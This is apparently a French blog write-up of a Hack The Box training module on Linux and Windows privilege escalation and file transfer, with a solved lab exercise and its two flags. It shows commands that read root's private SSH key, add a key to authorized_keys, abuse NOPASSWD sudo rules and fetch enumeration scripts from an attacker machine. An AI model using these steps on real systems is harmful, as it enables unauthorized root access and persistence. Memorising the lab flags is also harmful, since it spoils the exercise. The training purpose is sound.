Bon nombre des commandes mentionnées ci-dessus peuvent être exécutées automatiquement par un script afin d'analyser le rapport et d'y rechercher d'éventuelles failles. Il est possible d'exécuter **plusieurs scripts** pour énumérer automatiquement le serveur en lançant des commandes courantes qui renvoient les résultats pertinents. Parmi les scripts d'énumération Linux courants, on trouve [LinEnum](https://github.com/rebootuser/LinEnum) et [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), et pour Windows, [Seatbelt](https://github.com/GhostPack/Seatbelt) et [JAWS](https://github.com/411Hall/JAWS).

Un autre outil utile pour l'énumération de serveurs est la suite de scripts d'élévation de privilèges [PEASS (Privilege Escalation Awesome Scripts SUITE)](https://github.com/peass-ng/PEASS-ng), car elle est régulièrement mise à jour et inclut des scripts pour l'énumération sous **Linux et Windows**.

> Ces scripts exécuteront de nombreuses commandes connues pour identifier les vulnérabilités et généreront beaucoup de `bruit` susceptible de déclencher les logiciels **antivirus ou de surveillance** de sécurité qui recherchent ce type d'événements. Cela peut empêcher l'exécution des scripts, voire déclencher une alarme indiquant que le système a été compromis. Dans certains cas, il peut être préférable de procéder à une **énumération manuelle** plutôt que d'exécuter des scripts.
{: .prompt-info}

Prenons l'exemple de l'exécution du script Linux de PEASS appelé `LinPEAS` :

```bash
Arcony@htb[/htb]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
```

Comme on peut le constater, une fois le script exécuté, il **collecte des informations** et les affiche dans un excellent rapport. Examinons maintenant certaines des vulnérabilités à rechercher dans les résultats de ces scripts.

### Kernel Exploits

Lorsqu'un serveur exécute un système d'exploitation ancien, il convient de commencer par rechercher d'éventuelles `vulnérabilités du noyau`. Supposons que le serveur ne soit pas maintenu avec les dernières mises à jour et correctifs. Dans ce cas, il est probable qu'il soit vulnérable à des exploits spécifiques du noyau présents dans les versions non patchées de Linux et Windows.

Par exemple, le script ci-dessus a révélé que la **version Linux était 3.9.0-73-generic**. En recherchant des exploits pour cette version sur Google ou en utilisant **searchsploit**, on trouverait l'exploit `CVE-2016-5195`, également connu sous le nom de [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs). Il est possible de rechercher et de télécharger l'exploit `DirtyCow`, puis de l'exécuter sur le serveur pour obtenir un accès root.

Ce même principe s'applique à Windows, car de nombreuses vulnérabilités existent dans les versions anciennes ou non patchées, permettant diverses élévations de privilèges. Il est important de noter que **les exploits du noyau peuvent entraîner une instabilité du système**; il convient donc d'être **extrêmement prudent** avant de les exécuter sur des systèmes de production. Il est préférable de les tester en laboratoire et de ne les déployer sur des systèmes de production qu'avec l'accord explicite et en coordination avec notre client.

### Vulnerable Software

Il convient également d'examiner les logiciels installés. Par exemple, sous Linux, on peut utiliser la commande `dpkg -l`, et sous Windows, consulter le dossier `C:\Program Files` pour identifier **les logiciels installés sur le système**. Il est important de rechercher des failles de sécurité **connues** pour chaque logiciel installé, en particulier les anciennes versions contenant des vulnérabilités non corrigées.

### User Privileges

Un autre aspect crucial à examiner après avoir accédé à un serveur est celui des privilèges de l'utilisateur auquel nous avons accès. Supposons que nous soyons autorisés à exécuter certaines commandes en tant que **root** (ou en tant qu'autre utilisateur). Dans ce cas, nous pourrions `élever nos privilèges à ceux de l'utilisateur root/système` ou obtenir un accès `en tant qu'autre utilisateur`. Voici quelques méthodes courantes pour exploiter certains privilèges utilisateur :

1) Sudo
2) SUID
3) Privilèges liés aux jetons Windows

La commande `sudo` sous Linux permet à un utilisateur d'exécuter des commandes en tant qu'autre utilisateur. Elle est généralement utilisée pour permettre à des utilisateurs disposant de privilèges inférieurs d'exécuter des commandes en tant que **root** sans leur donner accès à ce compte. Ceci est généralement nécessaire car certaines commandes spécifiques ne peuvent être exécutées qu'en tant que root (« tcpdump ») ou permettent à l'utilisateur d'accéder à certains répertoires réservés à root. Nous pouvons vérifier nos privilèges sudo avec la commande `sudo -l`.

```bash
Arcony@htb[/htb]$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
```

Le résultat ci-dessus indique que nous pouvons exécuter **toutes les commandes avec sudo**, ce qui nous donne un accès complet, et que nous pouvons utiliser la commande `su` (Switch User suivit du nom de l'utilisateur, si vide, alors **root par défaut**) avec sudo pour passer à l'utilisateur root :

```bash
Arcony@htb[/htb]$ sudo su -

[sudo] password for user1:
whoami
root
```

La commande ci-dessus nécessite un mot de passe pour exécuter des commandes avec sudo. Dans certains cas, il est possible d'exécuter certaines applications, voire toutes les applications, **sans avoir à fournir de mot de passe**.

```bash
Arcony@htb[/htb]$ sudo -l

    (user : user) NOPASSWD: /bin/echo
```

L'entrée `NOPASSWD` indique que la commande `/bin/echo peut être exécutée sans mot de passe`. Cela serait utile si nous accédions au serveur **via une vulnérabilité** et que nous ne possédions pas le mot de passe de l'utilisateur. Comme il est indiqué `user`, nous pouvons exécuter sudo avec les droits de cet utilisateur et non en tant que root. Pour ce faire, nous pouvons spécifier l'utilisateur avec l'option `-u user`.

```bash
Arcony@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

Une fois qu'on a trouvé une application exécutable avec sudo, on peut chercher à l'exploiter pour obtenir un **shell en tant qu'utilisateur root**. [GTFOBins](https://gtfobins.github.io/) contient une liste de commandes et la manière de les **exploiter avec sudo**. On peut y rechercher l'application sur laquelle on dispose des privilèges sudo; si elle existe, elle peut indiquer la commande exacte à exécuter pour **obtenir un accès root**.

[LOLBAS](https://lolbas-project.github.io/#) contient également une liste d'applications Windows exploitables pour effectuer certaines actions, comme télécharger des fichiers ou exécuter des commandes avec les privilèges d'un utilisateur.

### Scheduled Tasks

Sous Linux comme sous Windows, il est possible d'exécuter des scripts à **intervalles réguliers** pour réaliser une tâche. Par exemple, un scan antivirus peut s'effectuer toutes les heures, ou un script de sauvegarde toutes les 30 minutes. Il existe généralement deux manières d'exploiter les **tâches planifiées (Windows)** ou les **tâches cron (Linux)** pour élever ses privilèges :

1) Ajouter de nouvelles tâches planifiées/tâches cron
2) Les manipuler pour exécuter un logiciel malveillant

La méthode la plus simple consiste à vérifier si l'ajout de nouvelles tâches planifiées est autorisé. Sous Linux, la gestion des tâches planifiées passe généralement par les tâches `cron`. Certains répertoires peuvent être utilisés pour ajouter de nouvelles tâches cron si l'on dispose des droits d'écriture. Il s'agit notamment des répertoires suivants :

- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`

Si l'écriture est possible dans un répertoire appelé par une **tâche cron**, il est possible d'écrire un **script Bash** contenant une commande de reverse shell, qui devrait ouvrir un reverse shell lors de son exécution.

### Exposed Credentials

Ensuite, nous pouvons rechercher des fichiers lisibles afin de vérifier s'ils contiennent des `identifiants exposés`. **Cette pratique est courante** pour les `fichiers de configuration`, les fichiers logs et l'historique utilisateur (**bash_history sous Linux et PSReadLine sous Windows**). Les scripts d'énumération évoqués précédemment recherchent généralement les mots de passe potentiels dans les fichiers et nous les fournissent, comme ci-dessous :

```bash
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```

Comme on peut le constater, le mot de passe de la base de données `password123` est exposé, ce qui nous permettrait de nous connecter aux bases de données **MySQL** locales et d'y rechercher des informations intéressantes. Nous pouvons également vérifier la `réutilisation du mot de passe`, car l'utilisateur système a **peut-être déjà utilisé son mot de passe pour les bases de données**. Dans ce cas, nous pourrions utiliser ce même mot de passe pour nous connecter à cet utilisateur, comme suit :

```bash
Arcony@htb[/htb]$ su -

Password: password123
whoami

root
```

Nous pouvons également utiliser les identifiants de l'utilisateur pour nous connecter au serveur via `SSH` en tant que cet utilisateur.

### SSH Keys

Enfin, abordons la question des clés SSH. Si nous disposons d'un accès en lecture au répertoire `.ssh` d'un utilisateur, nous pouvons lire sa clé SSH privée, située dans `/home/user/.ssh/id_rsa` ou `/root/.ssh/id_rsa`, et l'utiliser pour nous connecter au serveur. Si nous pouvons lire le répertoire `/root/.ssh/` et le fichier `id_rsa`, nous pouvons le copier sur notre machine et utiliser l'option `-i` pour nous connecter.

```bash
Arcony@htb[/htb]$ vim id_rsa
Arcony@htb[/htb]$ chmod 600 id_rsa
Arcony@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

> Notez que nous avons utilisé la commande `chmod 600 id_rsa` sur la clé après l'avoir créée sur notre machine afin de restreindre les permissions du fichier. Si les clés SSH ont des permissions trop permissives, c'est-à-dire qu'elles peuvent être lues par d'autres personnes, **le serveur SSH les empêchera de fonctionner**.
{: .prompt-info}

Si nous disposons d'un accès en écriture au répertoire `/users/.ssh/`, nous pouvons placer notre clé publique dans le répertoire SSH de l'utilisateur, à l'emplacement `/home/user/.ssh/authorized_keys`. Cette technique est généralement utilisée pour obtenir un accès SSH après avoir obtenu un shell avec les privilèges de cet utilisateur. La configuration SSH actuelle n'accepte pas les clés écrites par d'autres utilisateurs; cette méthode ne fonctionnera donc que si nous avons déjà obtenu le contrôle de cet utilisateur. Nous devons d'abord créer une nouvelle clé avec `ssh-keygen` et l'option `-f` pour spécifier le fichier de sortie.

```bash
Arcony@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
```

Cela nous donnera **deux fichiers** : key (que nous utiliserons avec `ssh -i`) et `key.pub`, que nous copierons sur la machine distante. Copions `key.pub`, puis, sur la machine distante, ajoutons-le au fichier `/root/.ssh/authorized_keys`.

```bash
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

Le serveur distant devrait maintenant nous permettre de nous connecter en tant qu'utilisateur en utilisant notre **clé privée** :

```bash
Arcony@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost#
```

Comme nous pouvons le constater, nous pouvons désormais nous connecter en SSH en tant qu'utilisateur root. Les modules d'élévation de privilèges Linux et Windows expliquent plus en détail comment utiliser chacune de ces méthodes d'élévation de privilèges, ainsi que bien d'autres.

---

**SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

SSH to `94.237.122.72` with user `user1` and password `password1` 

OK on a bien tout lu et compris les notions sur l'escalation de privilèges, maintenant nous allons appliquer le tout ici.

Dans un premier temps connectons nous au ssh en utilisant les infos précédentes pour faire la commande suivante : `ssh -p 49243 user1@94.237.122.72` pour nous connecter sur le port 49243 comme indiqué dans l'énoncé. Maintenant nous devons trouver un moyen pour nous connecter en tant que `user2`

Déjà nous pouvons lancer la commande `sudo -l` pour vérifier ce que nous pouvons faire avec sudo sur cette machine et voici le résultat:

```bash
user1@ng-1999270-gettingstartedprivesc-asyzs-788c6b4995-h84jr:~$ sudo -l
Matching Defaults entries for user1 on
    ng-1999270-gettingstartedprivesc-asyzs-788c6b4995-h84jr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        ng-1999270-gettingstartedprivesc-asyzs-788c6b4995-h84jr:
    (user2 : user2) NOPASSWD: /bin/bash
```

Nous observons que nous pouvons lancer la commande `/bin/bash` sans mot de passe !

Maintenant nous pouvons exécuter la commande suivant pour changer d'utilisateur avec sudo qui est le `-u` suivi du nom d'utilisateur puis le fameux `/bin/bash` qui ne nous demandera pas de mot de passe

```bash
sudo -u user2 /bin/bash
```

Maintenant nous sommes bien `user2` et nous avons juste besoin d'aller dans `/home/user2` et de `cat flag.txt`

**Réponse :** `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

Maintenant nous devons trouver un moyen de passer **root** donc je re essais avec la commande `sudo -l` mais cette fois ci ça me demande le mot de passe de `user2` que je n'ai pas donc je me penche sur autre chose.

Donc je cherche dans les cron jobs mais rien... je cherche dans des logs potentiels mais rien non plus... Et puis je commence a chercher le dossier `.ssh` mais il n'y est pas donc je fais comme dans l'exemple et j'essais de d'afficher le contenu de la clé ssh de **root** : `cat /root/.ssh/id_rsa` et bingo j'ai trouvé la clé privé ssh de root !

Je copie colle ensuite la clé ssh dans un fichier que je nomme `id_rsa`

> Attention ne pas oublier de faire un `chmod 600 id_rsa` pour que la clé ssh fonctionne !
{: .prompt-warning}

Puis comme pour le début pour me connecter en ssh je fais de même mais avec le `-i id_rsa` en plus : 

```bash
ssh root@94.237.122.72 -i id_rsa -p 49243
```

Et je cat le fichier `flag.txt` qui se trouve devant nous directement

**Réponse :** `HTB{pr1v1l363_35c4l4710n_2_r007}`

## Transferring Files

Lors de tout exercice de test d'intrusion, il est probable que nous devions `transférer des fichiers` vers le serveur distant, tels que des **scripts d'énumération ou des exploits, ou transférer des données** vers notre machine d'attaque. Bien que des outils comme Metasploit, avec un **shell Meterpreter**, permettent d'utiliser la commande `upload` pour téléverser un fichier, il est nécessaire d'apprendre les méthodes de transfert de fichiers via un reverse shell standard.

### Using wget

Il existe plusieurs méthodes pour y parvenir. L'une d'elles consiste à exécuter un [serveur HTTP Python](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server) sur notre machine, puis à utiliser `wget` ou `cURL` pour télécharger le fichier sur l'hôte distant. Pour commencer, nous nous rendons dans le répertoire contenant le fichier à transférer et y exécutons un `serveur HTTP Python` :

```bash
Arcony@htb[/htb]$ cd /tmp
Arcony@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Maintenant que nous avons configuré un **serveur d'écoute** sur notre machine, nous pouvons **télécharger le fichier sur l'hôte distant** sur lequel nous exécutons le code :

```bash
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Notez que nous avons utilisé notre adresse IP `10.10.14.1` et le port `8000` sur lequel notre serveur Python s'exécute. Si le serveur distant ne dispose pas de `wget`, nous pouvons utiliser `cURL` pour télécharger le fichier :

```bash
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

> Notez que nous avons utilisé l'option `-o` pour spécifier le nom du fichier de sortie.
{: .prompt_info}

### Using SCP

Une autre méthode pour transférer des fichiers consiste à utiliser `scp`, **à condition de disposer des identifiants SSH** sur l'hôte distant. Voici comment procéder :

```bash
Arcony@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

> Notez que nous avons spécifié le nom du fichier local après `scp`, et que le répertoire distant sera enregistré après le `:`.
{: .prompt-info}

### Using Base64

Dans certains cas, le transfert du fichier **peut s'avérer impossible**. Par exemple, le serveur distant peut être **protégé par un pare-feu** empêchant le téléchargement du fichier depuis notre machine. Dans ce cas, une astuce simple consiste à `encoder le fichier` au format [Base64](https://linux.die.net/man/1/base64), puis à coller la chaîne Base64 obtenue sur le serveur distant pour la `décoder`. Par exemple, pour transférer un fichier binaire nommé `shell`, l'encodage Base64 se fait comme suit :

```bash
Arcony@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Maintenant, nous pouvons copier cette `chaîne base64`, nous rendre sur l'hôte distant, utiliser la commande `base64 -d` pour la décoder et rediriger la sortie vers un fichier :

```bash
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

### Validating File Transfers

Pour valider le format d'un fichier, nous pouvons exécuter la commande [file](https://linux.die.net/man/1/file) sur celui-ci :

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Comme on peut le constater, la commande `file` exécutée sur le fichier shell indique qu'il s'agit d'un **binaire ELF**, ce qui signifie que le transfert a réussi. Pour vérifier que le fichier n'a pas été altéré lors de l'encodage/décodage, nous pouvons contrôler son hachage MD5. Sur notre machine, nous pouvons exécuter la commande `md5sum` :

```bash
Arcony@htb[/htb]$ shell md5sum

321de1d7e7c3735838890a72c9ae7d1d shell
```

Nous pouvons maintenant nous rendre sur le serveur distant et exécuter la même commande sur le fichier que nous avons transféré :

```bash
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Comme vous pouvez le constater, les deux fichiers possèdent le `même hachage MD5`, ce qui signifie que le transfert **a été effectué correctement**. Il existe d'autres méthodes pour transférer des fichiers. Pour une étude plus approfondie, consultez le [module Transferts de fichiers](https://academy.hackthebox.com/module/details/24).

**Cours complété**

{% include comments.html %}